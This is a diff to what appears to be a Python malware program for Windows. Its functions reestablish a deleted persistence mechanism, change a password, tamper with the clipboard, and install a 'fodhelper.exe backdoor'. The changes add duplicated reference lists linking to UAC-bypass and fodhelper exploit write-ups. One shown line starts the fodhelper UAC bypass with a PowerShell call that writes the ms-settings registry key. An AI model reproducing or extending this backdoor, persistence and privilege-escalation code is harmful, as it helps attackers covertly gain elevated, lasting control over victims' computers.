@@ -122,6 +122,16 @@ def add_invisible_character_to_clipboard() -> None:
 
 """
 Reestablishes persistence mechanism once it gets deleted
+
+Used as resources:  
+https://www.sharepointdiary.com/2022/12/powershell-check-if-registry-key-exists.htm - Powershell commands
+https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 - UAC Bypass
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-item?view=powershell-7.5: Set-Item
+https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/ - Fodhelper exploit
+https://www.linkedin.com/pulse/abusing-fodhelperexe-bypass-uac-prompt-elevate-poc-abhishek-sharma-crqsc/ - Fodhelper
+https://www.phillipsj.net/posts/executing-powershell-from-python/#:~:text=The%20code,can%20import%20the%20subprocess%20module.&text=Now%20we%20can%20make%20our,to%20execute%20our%20PowerShell%20command.&text=Let's%20make%20our%20Python%20file,commands%20we%20want%20to%20execute. - subprocess running correcting
+https://www.digitalocean.com/community/tutorials/python-system-command-os-subprocess-call  - subprocess.call 
+https://www.datacamp.com/tutorial/python-subprocess
 """
 def reestablish() -> None:
     #cmd to see if the runkey already exists
@@ -147,6 +157,16 @@ def change_password() -> None:
 
 """
 Establishes the fodhelper.exe backdoor by adding the necessary runkeys, also adds the persistence runkey in \Run
+
+Used as resources:  
+https://www.sharepointdiary.com/2022/12/powershell-check-if-registry-key-exists.htm - Powershell commands
+https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 - UAC Bypass
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-item?view=powershell-7.5: Set-Item
+https://foldsab.github.io/posts/UAC_bypass_using_fodhelper/ - Fodhelper exploit
+https://www.linkedin.com/pulse/abusing-fodhelperexe-bypass-uac-prompt-elevate-poc-abhishek-sharma-crqsc/ - Fodhelper
+https://www.phillipsj.net/posts/executing-powershell-from-python/#:~:text=The%20code,can%20import%20the%20subprocess%20module.&text=Now%20we%20can%20make%20our,to%20execute%20our%20PowerShell%20command.&text=Let's%20make%20our%20Python%20file,commands%20we%20want%20to%20execute. - subprocess running correcting
+https://www.digitalocean.com/community/tutorials/python-system-command-os-subprocess-call  - subprocess.call 
+https://www.datacamp.com/tutorial/python-subprocess 
 """
 def establish():
     cmd = ["powershell", "-Command", "New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force"]
